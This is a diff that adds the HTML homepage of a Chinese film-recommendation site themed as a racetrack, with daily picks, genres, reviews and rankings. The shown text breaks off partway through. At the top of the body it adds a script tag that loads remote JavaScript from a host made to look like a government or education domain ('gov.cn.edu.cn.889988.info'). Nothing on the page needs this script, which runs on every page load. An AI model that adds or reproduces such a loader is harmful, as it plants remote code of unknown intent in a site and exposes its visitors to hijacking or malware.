@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<title>神马伦理电影网 - 今日出闸片单_最新电影推荐_高分电影排行榜</title>
+<meta name="description" content="神马伦理电影网是专注电影推荐与影视资讯的中文影迷站点，按赛马场节奏每日开闸：今日出闸片单、赛道分类索引、赛后复盘影评、名次杆排行榜与观影指南，让每一部好片都像神驹一样跑在你前面。">
+<meta name="keywords" content="神马伦理电影网,电影推荐,今日出闸,最新电影,影视资讯,高分电影,电影排行榜,影评,观影指南,电影分类">
+<meta name="author" content="神马伦理电影网">
+<meta name="robots" content="index,follow">
+<meta name="revisit-after" content="1 days">
+<meta name="theme-color" content="#1E7A46">
+<link rel="canonical" href="https://shenmalunlidianyingwang-cn.github.io/">
+<link rel="alternate" hreflang="zh-CN" href="https://shenmalunlidianyingwang-cn.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="神马伦理电影网">
+<meta property="og:title" content="神马伦理电影网 - 今日出闸片单_最新电影推荐_高分电影排行榜">
+<meta property="og:description" content="神马伦理电影网按赛马场节奏每日开闸：今日出闸片单、赛道分类索引、赛后复盘影评与名次杆排行榜。">
+<meta property="og:url" content="https://shenmalunlidianyingwang-cn.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="神马伦理电影网 - 今日出闸片单与电影推荐">
+<meta name="twitter:description" content="神马伦理电影网每日更新今日出闸片单、赛后复盘影评与高分电影排行榜。">
+<style>
+:root{
+  --turf:#1E7A46;
+  --turf-d:#12572F;
+  --turf-l:#2E9A5C;
+  --dirt:#8B5A2B;
+  --dirt-d:#5E3A1A;
+  --rail:#F4F1E8;
+  --gold:#E5B23C;
+  --gold-d:#A87C1C;
+  --red:#C0392B;
+  --blue:#1F4E8C;
+  --paper:#FBF7EE;
+  --paper-2:#F4EEE0;
+  --ink:#221E19;
+  --ink-2:#544B41;
+  --muted:#8A7E6F;
+  --dim:#A89C8C;
+  --line:rgba(34,30,25,.16);
+  --max:1180px;
+  --sans:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei","Helvetica Neue",Arial,sans-serif;
+  --mono:"SFMono-Regular",Menlo,Consolas,"Courier New",monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:var(--sans);
+  font-size:16px;
+  line-height:1.8;
+  overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+:focus-visible{outline:2px solid var(--turf);outline-offset:3px}
+.wrap{width:100%;max-width:var(--max);margin:0 auto;padding:0 20px}
+.mono{font-family:var(--mono)}
+bdi{font-family:var(--mono);font-weight:700}
+s{color:var(--dim);text-decoration-thickness:1px}
+
+/* 赛道白栏杆 */
+.rail{height:16px;background:var(--dirt-d);position:relative;border-bottom:3px solid var(--rail)}
+.rail::before{
+  content:"";position:absolute;left:0;right:0;top:2px;height:4px;background:var(--rail);
+}
+.rail::after{
+  content:"";position:absolute;left:0;right:0;bottom:2px;height:4px;background:var(--rail);
+}
+.turfbar{height:8px;background:linear-gradient(90deg,var(--turf-d),var(--turf),var(--turf-l),var(--turf),var(--turf-d))}
+
+/* ===== 出闸提示条 ===== */
+.postbar{background:var(--turf-d);color:#DCF0E4}
+.postbar .wrap{display:flex;align-items:center;gap:16px;flex-wrap:wrap;min-height:38px;font-family:var(--mono);font-size:12.5px}
+.postbar .go{display:inline-flex;align-items:center;gap:8px;font-weight:700;color:var(--gold)}
+.postbar .go i{width:10px;height:10px;border-radius:50%;background:var(--gold);display:block;box-shadow:0 0 10px rgba(229,178,60,.9)}
+.postbar .rt{margin-left:auto;display:flex;gap:14px;flex-wrap:wrap}
+.postbar b{color:#fff}
+
+/* ===== 头部 ===== */
+header.top{background:var(--paper-2);border-bottom:2px solid var(--turf);position:sticky;top:0;z-index:80}
+.top-inner{display:flex;align-items:center;gap:16px;min-height:74px}
+.brand{display:flex;align-items:center;gap:12px;flex:0 0 auto}
+.horsemark{
+  width:46px;height:46px;flex:0 0 auto;border-radius:50%;
+  background:linear-gradient(150deg,var(--turf-l),var(--turf-d));
+  border:3px solid var(--gold);display:flex;align-items:center;justify-content:center;
+  font-family:var(--mono);font-size:15px;font-weight:800;color:#fff;
+  box-shadow:0 6px 16px rgba(30,122,70,.3);
+}
+.brand b{display:block;font-size:21px;letter-spacing:2px;line-height:1.2}
+.brand small{display:block;font-family:var(--mono);font-size:9.5px;letter-spacing:.24em;color:var(--dim)}
+nav.main{margin-left:auto;display:flex;gap:2px;flex-wrap:wrap}
+nav.main a{font-size:14.5px;padding:8px 13px;color:var(--ink-2);white-space:nowrap;border-bottom:2px solid transparent;transition:.18s}
+nav.main a:hover{color:var(--turf);border-bottom-color:var(--turf)}
+nav.main a.cur{color:var(--red);font-weight:700;border-bottom-color:var(--red)}
+.ck{display:none}
+.menu-btn{display:none;margin-left:auto;width:42px;height:38px;border:2px solid var(--turf);border-radius:8px;background:var(--paper);align-items:center;justify-content:center;cursor:pointer}
+.menu-btn i{display:block;width:18px;height:2px;background:var(--turf-d);position:relative}
+.menu-btn i::before,.menu-btn i::after{content:"";position:absolute;left:0;width:18px;height:2px;background:var(--turf-d)}
+.menu-btn i::before{top:-6px}
+.menu-btn i::after{top:6px}
+
+/* ===== HERO：起跑闸门 ===== */
+.hero{background:linear-gradient(180deg,var(--turf),var(--turf-d));color:#fff;position:relative;overflow:hidden}
+.hero::before{
+  content:"";position:absolute;inset:0;
+  background-image:repeating-linear-gradient(90deg,rgba(255,255,255,.06) 0 2px,transparent 2px 46px);
+}
+.hero-in{position:relative;z-index:2;padding:38px 0 30px;display:grid;grid-template-columns:1fr 400px;gap:28px;align-items:center}
+.hero h1{font-size:46px;line-height:1.22;letter-spacing:1px;font-weight:800;margin-bottom:14px}
+.hero h1 em{font-style:normal;background:var(--gold);color:#2B1E05;padding:0 12px;border-radius:6px}
+.hero .lead{font-size:16.5px;color:#CBE7D7;max-width:580px;margin-bottom:22px}
+.hero .lead b{color:#fff}
+.hero-actions{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:24px}
+.btn{display:inline-block;padding:12px 26px;font-size:15px;font-weight:700;border-radius:8px;transition:.2s}
+.btn-a{background:var(--gold);color:#2B1E05;box-shadow:0 7px 0 var(--gold-d)}
+.btn-a:hover{transform:translateY(-2px)}
+.btn-b{border:2px solid rgba(255,255,255,.6);color:#fff}
+.btn-b:hover{background:rgba(255,255,255,.12)}
+.hero-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid rgba(255,255,255,.24);border-radius:8px;overflow:hidden}
+.hero-stats div{padding:12px 14px;border-right:1px solid rgba(255,255,255,.24);background:rgba(0,0,0,.12)}
+.hero-stats div:last-child{border-right:0}
+.hero-stats strong{display:block;font-family:var(--mono);font-size:23px;color:var(--gold);line-height:1.2}
+.hero-stats span{font-size:11px;color:#A8CCB8;letter-spacing:.06em}
+
+/* 起跑闸门 */
+.gate{
+  background:var(--dirt-d);border:4px solid var(--rail);border-radius:10px;padding:16px 14px;
+  box-shadow:0 20px 40px rgba(0,0,0,.35);
+}
+.gate .gt{font-family:var(--mono);font-size:11px;letter-spacing:.2em;color:var(--gold);text-align:center;margin-bottom:12px}
+.gate .slots{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+.gate .slot{
+  background:linear-gradient(180deg,var(--dirt),var(--dirt-d));border:2px solid var(--rail);border-radius:6px;
+  padding:10px 6px;text-align:center;color:#F6EFE2;position:relative;overflow:hidden;
+}
+.gate .slot::before{content:"";position:absolute;left:0;right:0;top:0;height:4px;background:var(--rail);opacity:.5}
+.gate .slot b{display:block;font-family:var(--mono);font-size:22px;font-weight:800;line-height:1.1;color:var(--gold)}
+.gate .slot span{display:block;font-size:11px;opacity:.8;margin-top:2px}
+.gate .slot i{display:block;font-style:normal;font-family:var(--mono);font-size:9.5px;opacity:.65;margin-top:3px}
+.gate .gfoot{font-family:var(--mono);font-size:10.5px;color:#C9B79C;text-align:center;margin-top:12px;line-height:1.7}
+
+/* ===== 通用 ===== */
+section{padding:38px 0;scroll-margin-top:78px}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:24px;padding-bottom:12px;border-bottom:2px solid var(--ink)}
+.sec-head .l{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.sec-head .flag{
+  font-family:var(--mono);font-size:11.5px;letter-spacing:.14em;font-weight:700;color:#fff;
+  background:var(--turf);padding:5px 14px;border-radius:6px;
+}
+.sec-head .flag.g{background:var(--gold);color:#2B1E05}
+.sec-head .flag.r{background:var(--red)}
+.sec-head .flag.b{background:var(--blue)}
+.sec-head h2{font-size:28px;letter-spacing:1px;line-height:1.3}
+.sec-head p{font-size:13px;color:var(--muted);width:100%;margin-top:4px}
+.more{font-family:var(--mono);font-size:12px;border:2px solid var(--ink);padding:6px 15px;border-radius:6px;white-space:nowrap}
+.more:hover{background:var(--turf);border-color:var(--turf);color:#fff}
+
+/* ===== 栏目一：今日出闸（号码布卡） ===== */
+.horses{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.horse{
+  background:var(--paper-2);border:1px solid var(--line);border-radius:10px;overflow:hidden;
+  display:flex;flex-direction:column;transition:.24s;position:relative;
+}
+.horse:hover{transform:translateY(-6px);box-shadow:0 20px 36px rgba(34,30,25,.18)}
+.horse .blanket{
+  height:130px;position:relative;display:flex;align-items:center;justify-content:space-between;
+  padding:12px 14px;overflow:hidden;
+}
+.horse .blanket::before{
+  content:"";position:absolute;inset:0;
+  background-image:repeating-linear-gradient(45deg,rgba(255,255,255,.28) 0 12px,transparent 12px 24px);
+}
+.horse .blanket::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.45))}
+.horse .blanket .num{
+  position:relative;z-index:3;width:56px;height:56px;flex:0 0 auto;border-radius:50%;background:#fff;
+  display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:22px;font-weight:800;
+  border:3px solid rgba(0,0,0,.18);box-shadow:0 4px 12px rgba(0,0,0,.25);
+}
+.horse .blanket .ttl{position:relative;z-index:3;text-align:right;flex:1;padding-left:12px}
+.horse .blanket .ttl b{display:block;font-size:18px;color:#fff;letter-spacing:1px;line-height:1.35}
+.horse .blanket .ttl small{display:block;font-family:var(--mono);font-size:11px;color:rgba(255,255,255,.85);margin-top:2px}
+.horse h3{font-size:18px;margin:14px 16px 6px;letter-spacing:.5px}
+.horse p{font-size:13.5px;color:var(--ink-2);line-height:1.8;margin:0 16px;flex:1}
+.horse .tags{display:flex;gap:6px;flex-wrap:wrap;margin:12px 16px 0}
+.horse .tags span{font-family:var(--mono);font-size:10.5px;color:var(--muted);border:1px solid var(--line);padding:2px 9px;border-radius:4px}
+.horse .foot{display:flex;align-items:center;justify-content:space-between;gap:10px;margin:13px 16px 16px;padding-top:11px;border-top:1px dashed var(--line)}
+.horse .foot .pt{font-family:var(--mono);font-size:19px;font-weight:800;color:var(--turf)}
+.horse .foot a{font-family:var(--mono);font-size:12px;color:var(--red);border-bottom:2px solid var(--gold)}
+.horse .foot a:hover{color:var(--turf)}
+
+/* ===== 栏目二：赛道分类 ===== */
+.tracks{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.track{border:1px solid var(--line);border-radius:10px;background:var(--paper-2);overflow:hidden;transition:.24s}
+.track:hover{transform:translateY(-5px);box-shadow:0 18px 32px rgba(34,30,25,.16)}
+.track .surface{height:76px;position:relative;display:flex;align-items:center;padding:0 16px;justify-content:space-between}
+.track .surface::before{content:"";position:absolute;inset:0;opacity:.5;
+  background-image:repeating-linear-gradient(90deg,rgba(255,255,255,.6) 0 3px,transparent 3px 22px)}
+.track .surface b{position:relative;z-index:2;font-size:17px;letter-spacing:2px;color:#fff;text-shadow:0 2px 6px rgba(0,0,0,.5)}
+.track .surface em{position:relative;z-index:2;font-style:normal;font-family:var(--mono);font-size:11px;background:rgba(255,255,255,.85);color:#2B1E05;padding:2px 10px;border-radius:20px}
+.track ul{padding:14px 16px 16px}
+.track li a{
+  display:flex;align-items:center;justify-content:space-between;gap:8px;font-size:13.5px;color:var(--ink-2);
+  padding:7px 0;border-bottom:1px dotted var(--line);transition:.18s;
+}
+.track li a:hover{color:var(--turf)}
+.track li a i{font-style:normal;font-family:var(--mono);font-size:11px;color:var(--dim)}
+.track .tf{font-size:12px;color:var(--muted);padding:0 16px 14px;line-height:1.7}
+.tracks-note{font-size:12.5px;color:var(--muted);margin-top:18px;padding-top:14px;border-top:1px dashed var(--line)}
+
+/* ===== 栏目三：赛后复盘 ===== */
+.reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+.review{border:1px solid var(--line);border-left:6px solid var(--turf);border-radius:8px;background:var(--paper-2);padding:20px 22px;transition:.24s}
+.review:hover{transform:translateY(-5px);box-shadow:0 18px 32px rgba(34,30,25,.15)}
+.review .hd{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:10px}
+.review .hd .kind{font-family:var(--mono);font-size:11px;letter-spacing:.12em;background:var(--turf);color:#fff;padding:3px 11px;border-radius:4px}
+.review .hd .lap{font-family:var(--mono);font-size:11.5px;color:var(--muted);margin-left:auto}
+.review h3{font-size:18.5px;margin-bottom:8px;line-height:1.5}
+.review p{font-size:14px;color:var(--ink-2);line-height:1.85}
+.review blockquote{
+  margin:12px 0;padding:11px 0 11px 15px;border-left:3px solid var(--gold);
+  background:rgba(229,178,60,.14);font-size:14.5px;color:#5A4310;line-height:1.8;
+}
+.review .sig{display:flex;gap:14px;flex-wrap:wrap;font-family:var(--mono);font-size:11.5px;color:var(--muted);margin-top:12px;padding-top:11px;border-top:1px dashed var(--line)}
+
+/* ===== 栏目四：名次杆 ===== */
+.rankwrap{display:grid;grid-template-columns:1fr 320px;gap:22px}
+.pole{background:var(--paper-2);border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.pole li{
+  display:grid;grid-template-columns:88px 1fr 130px 66px;gap:14px;align-items:center;
+  padding:12px 18px;border-bottom:1px dashed var(--line);
+}
+.pole li:last-child{border-bottom:0}
+.pole .pos{
+  font-family:var(--mono);font-size:15px;font-weight:800;color:#fff;text-align:center;
+  padding:5px 0;border-radius:6px;background:var(--ink-2);
+}
+.pole li:nth-child(1) .pos{background:var(--gold);color:#2B1E05}
+.pole li:nth-child(2) .pos{background:#B9BFC4;color:#221E19}
+.pole li:nth-child(3) .pos{background:var(--dirt);color:#fff}
+.pole .nm b{display:block;font-size:16.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.pole .nm small{font-family:var(--mono);font-size:11px;color:var(--muted)}
+.pole .run{height:10px;border-radius:99px;background:var(--paper);border:1px solid var(--line);overflow:hidden}
+.pole .run i{display:block;height:10px;border-radius:99px;background:linear-gradient(90deg,var(--turf),var(--turf-l),var(--gold))}
+.pole .pt{font-family:var(--mono);font-size:19px;font-weight:800;color:var(--red);text-align:right}
+.sidecard{background:var(--turf);color:#E6F4EA;border-radius:10px;padding:20px}
+.sidecard h3{font-family:var(--mono);font-size:12.5px;letter-spacing:.16em;color:var(--gold);padding-bottom:10px;border-bottom:1px solid rgba(255,255,255,.24);margin-bottom:12px}
+.sidecard ol li{display:flex;align-items:center;gap:10px;padding:9px 0;border-bottom:1px dashed rgba(255,255,255,.2);font-size:13.5px}
+.sidecard ol li:last-child{border-bottom:0}
+.sidecard ol li b{font-family:var(--mono);color:var(--gold);flex:0 0 16px;font-size:12px}
+.sidecard ol li .od{margin-left:auto;font-family:var(--mono);font-size:12px;color:#BFE3CC}
+.sidecard ol li .od s{margin-right:6px;color:#8FBF9F}
+.sidecard p{font-size:12.5px;color:#A8CCB8;margin-top:12px;line-height:1.8}
+
+/* ===== 栏目五：关于 ===== */
+.about{display:grid;grid-template-columns:1.05fr .95fr;gap:20px}
+.ab{background:var(--paper-2);border:1px solid var(--line);border-top:5px solid var(--turf);border-radius:10px;padding:26px 28px}
+.ab h3{font-size:21px;letter-spacing:1px;margin-bottom:12px;padding-bottom:10px;border-bottom:1px solid var(--line)}
+.ab p{font-size:14.5px;color:var(--ink-2);margin-bottom:11px}
+.ab p:last-child{margin-bottom:0}
+.ab p b{color:var(--ink)}
+.ab .hl{color:var(--turf);font-weight:700}
+.rules li{display:grid;grid-template-columns:56px 1fr;gap:12px;padding:11px 0;border-bottom:1px dashed var(--line);font-size:14px;line-height:1.75}
+.rules li:last-child{border-bottom:0}
+.rules li em{font-style:normal;font-family:var(--mono);font-size:11.5px;font-weight:800;color:var(--red);padding-top:3px;letter-spacing:.06em}
+.card-mini{margin-top:16px;border:1px dashed var(--line);border-radius:8px;padding:14px 16px;background:var(--paper)}
+.card-mini h4{font-family:var(--mono);font-size:11.5px;letter-spacing:.16em;color:var(--turf);margin-bottom:8px}
+.card-mini dl{display:grid;grid-template-columns:1fr auto;gap:0}
+.card-mini dt{padding:6px 0;border-bottom:1px dotted var(--line);font-size:13px;color:var(--ink-2)}
+.card-mini dd{padding:6px 0;border-bottom:1px dotted var(--line);font-family:var(--mono);font-size:14px;font-weight:700;color:var(--turf);text-align:right}
+.card-mini dt:last-of-type,.card-mini dd:last-of-type{border-bottom:0}
+
+/* ===== 栏目六：FAQ ===== */
+.faq{background:var(--paper-2);border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.faq details{border-bottom:1px dashed var(--line)}
+.faq details:last-child{border-bottom:0}
+.faq summary{cursor:pointer;padding:16px 22px;font-size:16px;font-weight:600;list-style:none;position:relative;padding-right:60px}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::before{content:"▶";color:var(--turf);margin-right:10px;font-size:12px}
+.faq details[open] summary::before{content:"▼"}
+.faq details[open] summary{background:var(--turf);color:#fff}
+.faq summary .code{position:absolute;right:22px;top:16px;font-family:var(--mono);font-size:11px;color:var(--dim)}
+.faq details[open] summary .code{color:rgba(255,255,255,.7)}
+.faq details p{padding:14px 22px 20px;font-size:14px;color:var(--ink-2);line-height:1.9;border-top:1px dashed var(--line)}
+
+/* ===== 底部 ===== */
+footer{margin-top:26px;background:var(--ink);color:#C6BFB4;padding:38px 0 26px}
+.f-grid{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:24px}
+.f-col h4{font-size:15.5px;letter-spacing:1px;color:var(--gold);margin-bottom:13px;padding-bottom:9px;border-bottom:1px solid rgba(255,255,255,.16)}
+.f-col p{font-size:13.5px;color:#A8A196;line-height:1.9}
+.f-col li{padding:6px 0;border-bottom:1px dashed rgba(255,255,255,.14)}
+.f-col li a{font-size:13.5px;color:#A8A196}
+.f-col li a:hover{color:var(--gold)}
+.f-url{font-family:var(--mono);font-size:12.5px;color:var(--gold);margin-top:10px;display:inline-block;word-break:break-all}
+.kw{margin-top:24px;padding-top:18px;border-top:1px dashed rgba(255,255,255,.16);font-size:12.5px;color:#8E877C;line-height:2.1}
+.kw a{display:inline-block;margin:4px 8px 0 0;border:1px solid rgba(255,255,255,.2);border-radius:6px;padding:3px 12px;color:#A8A196;font-size:12.5px}
+.kw a:hover{background:var(--gold);color:var(--ink);border-color:var(--gold)}
+.f-bot{margin-top:18px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;font-family:var(--mono);font-size:11.5px;color:#8E877C}
+.f-bot a{color:#8E877C}
+.f-bot a:hover{color:var(--gold)}
+
+/* ===== 响应式 ===== */
+@media (max-width:1024px){
+  .hero-in{grid-template-columns:1fr;gap:22px;padding:32px 0 26px}
+  .hero h1{font-size:38px}
+  .horses{grid-template-columns:repeat(2,1fr)}
+  .tracks{grid-template-columns:1fr}
+  .reviews{grid-template-columns:1fr}
+  .rankwrap{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr}
+  .f-grid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:860px){
+  nav.main{display:none;position:absolute;left:0;right:0;top:100%;background:var(--paper-2);border-bottom:2px solid var(--turf);flex-direction:column;align-items:stretch;padding:10px 14px 16px;gap:2px;margin-left:0;box-shadow:0 16px 30px rgba(34,30,25,.2)}
+  nav.main a{padding:13px 16px;font-size:15.5px;border-bottom:1px solid var(--line)}
+  .menu-btn{display:flex}
+  .ck:checked ~ nav.main{display:flex}
+  .top-inner{position:relative;min-height:66px}
+  .pole li{grid-template-columns:74px 1fr 60px;gap:12px}
+  .pole .run{display:none}
+}
+@media (max-width:640px){
+  body{font-size:15px}
+  .wrap{padding:0 14px}
+  .rail{height:12px}
+  .postbar .wrap{gap:10px;font-size:11.5px}
+  .postbar .rt{margin-left:0;width:100%}
+  .brand b{font-size:18px;letter-spacing:1px}
+  .horsemark{width:38px;height:38px;font-size:13px;border-width:2px}
+  .hero-in{padding:24px 0 22px}
+  .hero h1{font-size:29px}
+  .hero .lead{font-size:15px}
+  .hero-stats{grid-template-columns:repeat(2,1fr)}
+  .hero-stats div:nth-child(2){border-right:0}
+  .hero-stats div:nth-child(1),.hero-stats div:nth-child(2){border-bottom:1px solid rgba(255,255,255,.24)}
+  .hero-stats strong{font-size:19px}
+  .gate{padding:12px 10px}
+  .gate .slots{grid-template-columns:repeat(3,1fr);gap:7px}
+  .gate .slot{padding:8px 4px}
+  .gate .slot b{font-size:18px}
+  .gate .slot span{font-size:10px}
+  .gate .slot i{font-size:8.5px}
+  .sec-head h2{font-size:22px}
+  .horses{grid-template-columns:1fr}
+  .horse .blanket{height:120px}
+  .horse .blanket .num{width:48px;height:48px;font-size:19px}
+  .track .surface{height:64px}
+  .review{padding:18px 20px}
+  .pole li{padding:11px 14px;gap:10px}
+  .pole .pos{font-size:13px}
+  .pole .nm b{font-size:15px}
+  .pole .pt{font-size:16px}
+  .sidecard{padding:18px}
+  .ab{padding:20px 20px}
+  .faq summary{font-size:15px;padding-right:52px}
+  .faq summary .code{font-size:10px}
+  .f-grid{grid-template-columns:1fr}
+  section{padding:28px 0}
+}
+@media (prefers-reduced-motion:reduce){*{animation:none !important;transition:none !important;scroll-behavior:auto !important}}
+@media print{header.top{position:static}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="rail" aria-hidden="true"></div>
+<div class="turfbar" aria-hidden="true"></div>
+
+<!-- 出闸提示条 -->
+<div class="postbar">
+  <div class="wrap">
+    <span class="go"><i aria-hidden="true"></i>今日出闸</span>
+    <span>在闸 <b>6</b> 驹</span>
+    <span>赛道 <b>草地 / 泥地</b></span>
+    <span class="rt">
+      <span>第 <b>1286</b> 场</span>
+      <span>每日 08:00 开闸</span>
+      <span>2026-10-02</span>
+    </span>
+  </div>
+</div>
+<div class="turfbar" aria-hidden="true"></div>
+
+<!-- 头部 -->
+<header class="top">
+  <div class="wrap top-inner">
+    <a class="brand" href="#" aria-label="神马伦理电影网首页">
+      <span class="horsemark" aria-hidden="true">神</span>
+      <span>
+        <b>神马伦理电影网</b>
+        <small>SHENMA MOVIE RACETRACK</small>
+      </span>
+    </a>
+    <input class="ck" id="navck" type="checkbox" aria-label="展开导航菜单">
+    <label class="menu-btn" for="navck" aria-hidden="true"><i></i></label>
+    <nav class="main" aria-label="主导航">
+      <a class="cur" href="#">马场大堂</a>
+      <a href="#gates">今日出闸</a>
+      <a href="#tracks">赛道分类</a>
+      <a href="#reviews">赛后复盘</a>
+      <a href="#rank">名次杆</a>
+      <a href="#about">关于本站</a>
+      <a href="#faq">常见问答</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- HERO -->
+  <section class="hero" id="home">
+    <div class="wrap hero-in">
+      <div>
+        <p class="mono" style="font-size:12px;letter-spacing:.2em;color:var(--gold);margin-bottom:14px">RACE NO.1286　·　全 场 6 驹　·　草 地 1200 米</p>
+        <h1>好片像<em>神驹</em><br>神马伦理电影网替你看闸</h1>
+        <p class="lead">片库里翻两个小时，不如看一场精心排好的赛。<b>神马伦理电影网</b>把每天值得看的电影排进起跑闸门：今日出闸是当日片单，赛道分类是索引，赛后复盘是影评，名次杆是排行榜。枪响之后，你只管跟着跑得最快的那一匹。</p>
+        <div class="hero-actions">
+          <a class="btn btn-a" href="#gates">打开今日出闸</a>
+          <a class="btn btn-b" href="#rank">查看名次杆</a>
+        </div>
+        <div class="hero-stats">
+          <div><strong>16800</strong><span>收录影片</span></div>
+          <div><strong>36</strong><span>赛道分类</span></div>
+          <div><strong>08:00</strong><span>每日开闸</span></div>
+          <div><strong>8.7</strong><span>编辑均分</span></div>
+        </div>
+      </div>
+
+      <div class="gate">
+        <p class="gt">STARTING GATE　—　起 跑 闸 门</p>
+        <div class="slots">
+          <div class="slot"><b>1</b><span>长街尽头</span><i>悬疑</i></div>
+          <div class="slot"><b>2</b><span>归途列车</span><i>剧情</i></div>
+          <div class="slot"><b>3</b><span>第七大陆</span><i>科幻</i></div>
+          <div class="slot"><b>4</b><span>橘子汽水</span><i>文艺</i></div>
+          <div class="slot"><b>5</b><span>纸上星河</span><i>动画</i></div>
+          <div class="slot"><b>6</b><span>一年七城</span><i>纪录</i></div>
+        </div>
+        <p class="gfoot">闸位说明：神马伦理电影网按当日编辑判断排列闸位，<br>与最终名次无关，仅代表出闸顺序。</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：今日出闸 -->
+  <section id="gates">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="flag">GATE 01-06</span>
+          <h2>今日出闸片单</h2>
+        </div>
+        <a class="more" href="#">查看完整片库</a>
+        <p>神马伦理电影网编辑组每日 08:00 开闸 · 每匹"赛驹"标注片长、评分与跑道类型</p>
+      </div>
+
+      <div class="horses">
+        <article class="horse">
+          <div class="blanket" style="background:linear-gradient(140deg,#C0392B,#6E1E16)">
+            <span class="num">1</span>
+            <span class="ttl"><b>长街尽头</b><small>2026 · 悬疑 / 犯罪 · 128′</small></span>
+          </div>
+          <h3>长街尽头</h3>
+          <p>双线叙事在第七十分钟交汇，此后每段回忆都在改写前面的判断，是今年华语悬疑里逻辑最自洽的一部。</p>
+          <div class="tags"><span>悬疑</span><span>华语</span><span>反转</span></div>
+          <div class="foot"><span class="pt">8.9</span><a href="#">看它起跑</a></div>
+        </article>
+
+        <article class="horse">
+          <div class="blanket" style="background:linear-gradient(140deg,#1F4E8C,#123058)">
+            <span class="num">2</span>
+            <span class="ttl"><b>归途列车</b><small>2026 · 剧情 / 家庭 · 118′</small></span>
+          </div>
+          <h3>归途列车</h3>
+          <p>一趟跨省列车上的六个陌生人，用一夜时间讲完各自未说完的话，结尾长镜头值得回看一遍。</p>
+          <div class="tags"><span>剧情</span><span>家庭</span><span>高分</span></div>
+          <div class="foot"><span class="pt">8.8</span><a href="#">看它起跑</a></div>
+        </article>
+
+        <article class="horse">
+          <div class="blanket" style="background:linear-gradient(140deg,#2E9A5C,#123F26)">
+            <span class="num">3</span>
+            <span class="ttl"><b>第七大陆</b><small>2026 · 科幻 / 冒险 · 131′</small></span>
+          </div>
+          <h3>第七大陆</h3>
+          <p>极地科考站失联后的七十二小时，视觉体系克制而压迫感十足，建议一次跑完不要中途停。</p>
+          <div class="tags"><span>科幻</span><span>视效</span><span>新片</span></div>
+          <div class="foot"><span class="pt">8.6</span><a href="#">看它起跑</a></div>
+        </article>
+
+        <article class="horse">
+          <div class="blanket" style="background:linear-gradient(140deg,#D18B2C,#6E4610)">
+            <span class="num">4</span>
+            <span class="ttl"><b>橘子汽水</b><small>2025 · 青春 / 文艺 · 104′</small></span>
+          </div>
+          <h3>橘子汽水</h3>
+          <p>被多数榜单漏掉的小成本作品，讲一个小镇夏天与一场迟到的告别，节奏舒缓适合慢跑。</p>
+          <div class="tags"><span>文艺</span><span>青春</span><span>冷门</span></div>
+          <div class="foot"><span class="pt">8.4</span><a href="#">看它起跑</a></div>
+        </article>
+
+        <article class="horse">
+          <div class="blanket" style="background:linear-gradient(140deg,#7A3E8E,#3E1D4A)">
+            <span class="num">5</span>
+            <span class="ttl"><b>纸上星河</b><small>2026 · 动画 / 治愈 · 096′</small></span>
+          </div>
+          <h3>纸上星河</h3>
+          <p>手绘质感极佳，一封寄不出去的信被整座城市接力传递，孩子看冒险，大人看告别。</p>
+          <div class="tags"><span>动画</span><span>治愈</span><span>合家欢</span></div>
+          <div class="foot"><span class="pt">8.3</span><a href="#">看它起跑</a></div>
+        </article>
+
+        <article class="horse">
+          <div class="blanket" style="background:linear-gradient(140deg,#8B5A2B,#3E2810)">
+            <span class="num">6</span>
+            <span class="ttl"><b>一年七城</b><small>2024 · 纪录 / 人文 · 112′</small></span>
+          </div>
+          <h3>一年七城</h3>
+          <p>七位导演各拍一座城的一年，剪辑节奏舒服、信息密度高，可分两个晚上慢慢看完。</p>
+          <div class="tags"><span>纪录</span><span>人文</span><span>分集</span></div>
+          <div class="foot"><span class="pt">8.2</span><a href="#">看它起跑</a></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：赛道分类 -->
+  <section id="tracks">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="flag b">TRACK</span>
+          <h2>赛道分类索引</h2>
+        </div>
+        <a class="more" href="#">进入完整索引</a>
+        <p>神马伦理电影网按赛道类型、地区、年份分组，同一部影片可报名多条赛道</p>
+      </div>
+
+      <div class="tracks">
+        <div class="track">
+          <div class="surface" style="background:linear-gradient(90deg,#1E7A46,#2E9A5C)">
